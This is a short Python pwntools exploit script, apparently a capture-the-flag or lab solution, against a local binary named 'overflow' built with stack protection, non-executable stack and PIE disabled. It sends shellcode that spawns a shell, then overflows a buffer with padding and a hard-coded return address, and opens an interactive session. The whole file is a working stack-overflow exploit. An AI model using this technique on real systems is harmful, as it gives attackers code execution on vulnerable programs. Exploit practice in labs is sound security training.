#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

# gcc -fno-stack-protector -z execstack -no-pie overflow.c -o overflow
c = process('./overflow')

context.os='linux'
context.arch='amd64'

ans = asm(shellcraft.sh())
c.sendline(ans)

ans = 'A' * (10 + 8)
ans += p64(0x404060)

c.sendline(ans)
c.interactive()
c.close()
